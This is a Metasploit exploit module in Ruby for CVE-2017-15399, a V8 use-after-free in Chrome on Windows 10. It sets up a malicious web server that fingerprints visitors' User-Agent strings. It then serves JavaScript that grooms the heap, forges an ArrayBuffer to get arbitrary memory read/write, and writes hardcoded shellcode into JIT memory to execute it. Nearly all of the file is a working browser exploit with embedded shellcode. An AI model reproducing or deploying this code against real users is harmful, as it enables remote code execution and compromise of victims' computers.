##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "CVE-2017-15399 V8:Use After Free Leads to Remote Code Execution",
            'Description'    => %q{
                This is a Use After Free Vul in V8.It can cause RCE in the Chrome renderer process(CVE-2017-15399)
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Zhao Qixun (Qihoo 360 Vulcan Team)',          # Original RE research and exploitation
                'Youngjoon Kim <acorn421[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Chrome on Windows 10', { } ],
                [ 'Chrome 62.0.3202.62 on Windows 10 1703', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2017-15399' ],   
                [ 'CBT', '776677' ]       # Chromium Bug Tracker
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "October 20 2017",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Chrome #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if (!cm.empty? && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      js_p = get_payload(t)

      html = <<-HTML
      <html>
      <script>
        try{
        var arr_arr = [];
        arr_arr.length = 0x500;

        var array = [1.1];
        array.length = 0x10000;
        array.fill(2.2);

        var obj_arr = [{}];
        obj_arr.length = 0x20000;
        obj_arr.fill(0x2345678);

        var nop = 0xdaba0000;
        var ab_map_obj = [
          nop,
          0x0d00000a,0x000900c4,0x082003ff,
          nop,  // point to __proto__ (null_obj)
          nop,nop,nop,nop,nop,nop
        ]

        var fake_ab = [
          nop,   //point to ab_map_obj
          nop,
          nop,
          0x1000, /* buffer length */
          0x12345678,0x12345678, /* buffer adderss */
          0x800,0x4,0x0,0x0
        ]


        function gc(){
          for(var i = 0;i <((1024*1024)/16);i++){
            var a = new String();
          }
        }

        function d2u(high,low){
          d = new Uint32Array(2);
          d[0] = low;
          d[1] = high;
          f = new Float64Array(d.buffer);
          return f[0];
        }
        function u2d(num){
          f = new Float64Array(1);
          f[0] = num;
          d = new Uint32Array(f.buffer);
          return d;
        }

        function heap_feng_shui(){
          for(var i = 0;i < arr_arr.length;i++){
            arr_arr[i] = array.slice(0,array.length);
          }
        }

        function module(stdlib,foreign,buffer){
          "use asm";
          var fl = new stdlib.Uint32Array(buffer);
          function f1(x){
            x = x | 0;
            fl[0] = x;
            //fl[0x10000] = x;
            //fl[0x100000] = x;
            fl[0x20041] = x;
            fl[0x20042] = x;
            fl[0x20043] = x;
            fl[0x40041] = x;
            fl[0x40042] = x;
            fl[0x40043] = x;
          }
          return f1;
        }

        var global = {Uint32Array:Uint32Array};
        var env = {};
        memory = new WebAssembly.Memory({initial:200});
        var buffer = memory.buffer;
        evil_f = module(global,env,buffer);

        zz = {};
        zz.toString = function(){
          
          
          heap_feng_shui();
          //alert(1);
          Array.prototype.slice.call([]);
          return 0xffffffff;
        }
        evil_f(3);
        memory.grow(1);
        evil_f(zz);

        /******** find the big array *******************/
        var big_array = null;
        for(var j = 0;j < arr_arr.length;j++){
          var temp = arr_arr[j];
          //alert(temp[0]);
          if(temp[0] !== 2.2){
            //dafd;
            //alert(j);
            big_array = arr_arr[j];
          }
        }
        if(big_array != null){
          big_array.length = 0x23ffffff;
          if(big_array[0x20000] == 2.2){
            big_array[0x20000] = 0xdaba0;
          }
          else{
            alert("find next array fail!");
          }
          //alert(big_array.length);
          //var read_test = big_array[0x22567890];
        }
        else{
          alert("find big array fail!");
        }

        var next_array_to_free = null;
        for(var j = 0;j < arr_arr.length;j++){
          var temp = arr_arr[j];
          //alert(temp[0]);
          if(temp[0] == 0xdaba0){
            next_array_to_free = j;
            break;
          }
        }


        /*********** Find the element address,and make a obj array,make a type confusion **********/

        var big_array_element_addr = -1;

        big_array_element_addr = (u2d(big_array[0x1f7e0]))[0] + 8 - 0x20000 * 8;



        //for(var j = 0;j < arr_arr.length;j++){
        //	arr_arr[j] = null;
        //}
        arr_arr[next_array_to_free] = null;
        //arr_arr = null;
        gc();
        arr_arr.length = 0x300;
        for(var j = 0;j < arr_arr.length;j++){
          arr_arr[j] = obj_arr.slice(0,obj_arr.length);
        }
        //alert("allocate success");
        big_array[0x40000] = d2u(0xdaba0 << 1,0xdaba0 << 1);
        //alert("write success");
        var next_obj_array = null;
        for(var j = 0;j < arr_arr.length;j++){
          var temp = arr_arr[j];
          if(temp[0] == 0xdaba0){
            //alert("find success");
            next_obj_array = arr_arr[j];
            break;
          }
        }

        /*********** Okay,Type Confusion Time!!! **********/
        if(next_obj_array == null){
          alert("find next obj array fail!");
          dafd;
        }
        var ab = new ArrayBuffer(0x100);
        next_obj_array[0] = ab.__proto__;

        var ab_proto__addr = u2d(big_array[0x40000])[0];
        //alert(ab_proto__addr.toString(16));

        /*********** Fake a Object now **********/
        fake_ab[0] = big_array_element_addr + 0x100 + 0x1;
        fake_ab[1] = big_array_element_addr + 0x100 + 0x1;
        fake_ab[2] = big_array_element_addr + 0x100 + 0x1;
        ab_map_obj[0] = ab_proto__addr;
        ab_map_obj[4] = ab_proto__addr;
        ab_map_obj[5] = ab_proto__addr - 0xe4;

        var zzz = 0;
        for(var zz = 0;zz < fake_ab.length; zz=zz+2){
          var float_num = d2u(fake_ab[zz+1],fake_ab[zz]);
          big_array[zzz] = float_num;
          zzz++;
        }

        zzz = 0;
        for(var zz = 0;zz < ab_map_obj.length; zz=zz+2){
          var float_num = d2u(ab_map_obj[zz+1],ab_map_obj[zz]);
          big_array[zzz+0x100/8] = float_num;
          zzz++;
        }

        big_array[0x40002] = d2u(big_array_element_addr+1);




        var fake_ab = next_obj_array[5];

        //alert("before hahahah");

        //fake_dv = new DataView(fake_ab,0,0x10);

        if(fake_ab instanceof ArrayBuffer == true){
          //alert("hahahah");
        }

        fake_dv = new DataView(fake_ab,0,0x600);

        /******************************* Read a Function Address   ***************************************/

        var func_body = "eval('');";
          /*for(var i=0;i < 0x1000;i++){
            func_body += "a[" + i.toString() + "];";
          }*/
        var function_to_shellcode = new Function("a",func_body);

        next_obj_array[0] = function_to_shellcode;

        function_to_shellcode();

        var shellcode_address_ref = u2d(big_array[0x40000])[0];
        //alert(shellcode_address_ref.toString(16));
        var jit_address = shellcode_address_ref + 0x1c;
        //alert(jit_address.toString(16));
          
        /**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
          
        function Read32(addr){
          big_array[2] = d2u(addr,addr);
          return fake_dv.getUint32(0,true);
        }
        function Write32(addr,value){
          big_array[2] = d2u(addr,addr);
          //fake_dv = new DataView(fake_arraybuffer,0,0x4000);
          //alert(fake_ab_float[4]);
          alert("write");		
          fake_dv.setUint32(0,value,true);
          //fake_dv[0] = value;
        }

        //alert((big_array_element_addr).toString(16));
        jit_address = Read32(jit_address-1)-1+0x40;

        //alert(jit_address.toString(16));

        var shellcode = [0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]

        big_array[2] = d2u(jit_address,jit_address);

        for(var i=0; i<shellcode.length; i++){
          var value = shellcode[i];		
          fake_dv.setUint32(i * 4,value,true);
        }

        //alert("go to shellcode plz,chrome");
        function_to_shellcode();

        alert("finish");

        }catch(e){
          alert(e);
        }

        </script>
      </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
      end
  
      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end

